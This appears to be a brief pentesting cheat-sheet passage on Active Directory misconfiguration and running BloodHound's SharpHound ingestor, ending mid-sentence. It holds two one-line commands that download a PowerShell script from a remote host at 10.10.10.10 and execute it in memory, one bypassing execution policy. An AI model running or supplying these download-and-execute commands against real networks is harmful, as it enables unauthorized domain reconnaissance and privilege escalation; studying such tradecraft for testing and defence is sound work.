# Active Directory Fun
Active Directory is a complex environment that is easy to misconfigure. 
It is important to understand the various groups and permission types within AD and how they could lead to privledge escalation. 
https://adsecurity.org/?p=3658 

## BloodHound 
BloodHound is a powerful tool used to perform analysis on AD environments.

### Setup
BloodHound can be setup pretty easily on Kali:
https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/

### Bloodhound Powershell Injestion 
A powershell injesetor can be found on the Bloodhound Github repo: 
https://github.com/BloodHoundAD/BloodHound  
/Ingestors/SharpHound.ps1

This can be run "filelessly" from a powershell console (assuming you are hosting the file on your remote server at 10.10.10.10) like so: 
```
PS C:\> IEX(New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/BloodHound.ps1'); Invoke-Bloodhound -CollectionMethod All
```
Or from a Windows commandline console like so:  
```
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/BloodHound.ps1'); Invoke-Bloodhound -CollectionMethod All"
``` 
BloodHound will run and generate a zip file that you can Drag and Drop into the Neo4j JAVA interface for bloodhound.
BloodHound can 


